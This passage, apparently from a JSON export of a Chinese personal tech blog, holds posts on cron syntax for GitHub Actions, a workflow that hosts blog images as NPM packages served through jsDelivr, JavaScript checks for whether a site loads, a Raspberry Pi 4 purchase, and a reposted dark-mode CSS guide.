align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 